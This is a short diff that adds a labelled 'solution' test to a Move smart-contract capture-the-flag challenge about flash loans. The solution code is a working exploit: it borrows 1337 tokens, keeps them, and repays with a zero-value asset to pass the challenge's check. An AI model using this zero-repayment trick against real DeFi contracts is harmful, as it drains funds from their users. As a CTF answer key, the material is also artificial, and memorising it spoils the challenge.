@@ -85,4 +85,15 @@ module challenge::flash {
         assert!(primary_fungible_store::balance(@challenger, management.metadata) == 0, 3);
 
     }
+
+    // solution
+    #[test(account = @1338, challenger = @challenger, aptos_framework = @0x1)]
+    public entry fun solve(account: &signer, challenger: &signer) acquires Management, ChallengeStatus {
+        initialize(challenger);
+        let loans = flash_loan(account, 1337);
+        let zero_repay = fungible_asset::zero(fungible_asset::asset_metadata(&loans));
+        primary_fungible_store::deposit(signer::address_of(account), loans);
+        repay(account,zero_repay);
+        is_solved(account);
+    }
 }
